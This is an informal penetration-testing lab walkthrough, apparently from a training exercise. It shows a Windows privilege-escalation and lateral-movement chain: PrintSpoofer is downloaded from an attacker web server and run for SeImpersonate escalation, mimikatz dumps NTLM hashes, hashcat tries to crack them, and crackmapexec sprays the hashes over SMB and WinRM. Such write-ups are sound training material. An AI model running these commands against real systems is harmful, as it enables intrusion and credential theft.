Ok Now im Very curious to check whether I'm bale to increase my Privilege using SeImpersonate.

**Will transfer PrintSpoofer from our kali to windows machine:** 
Already I started my python webserver on my kali, so will use below command to download the PrintSpoofer.exe from kali.
```
iwr -uri "http://192.168.45.177/PrintSpoofer.exe" -Outfile print.exe
```

![[Pasted image 20240602150850.png]]

![[Pasted image 20240602150814.png]]
We successfully downloaded the PrintSpoofer.exe to **\\users\\public** directory

**Now will run the program to elevate our privileges:**
```
./print.exe -i -c cmd
```

![[Pasted image 20240602150955.png]]
There you goooo......!, we Elevated our privilege

**Now will run mimikatz to get any NTLM hashes or passwords:**
As always, I have transferred the mimikatz to windows machine from my kali with the help of **iwr** command. the python webserver is already up.
![[Pasted image 20240602165019.png]]

**And will run the following command to retrieve NTLM hashes or Passwords:**
```
privilege::debug
sekurlsa::logonpasswords
```
![[Pasted image 20240602165219.png]]
![[Pasted image 20240602165240.png]]
So we got NTLM hashes for two users Celia and Mary

Now will try to crak the ntlm hashes using hashcat: I have saved those two hashes in a file ntlm.hash
```
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt --force
```
![[Pasted image 20240602165458.png]]
But no luck, we can't crack the hashes.

**No problem will try to brute force with hashes we got:**
```
crackmapexec smb 10.10.151.0/24 -u users.txt -H ntlm.hash --continue-on-success --shares
```

![[Pasted image 20240602165622.png]]
We can see that user Celia's hash worked for smb, but we can't list any shares.

Now will try that for winrm:
```
crackmapexec winrm 10.10.151.0/24 -u users.txt -H ntlm.hash --continue-on-success
```
![[Pasted image 20240602165749.png]]
Cooool, we got pwned sign. We can confirm that Celia is a local admin of the machine MS02.

 **Now will move to MS02 (T2....!)**
 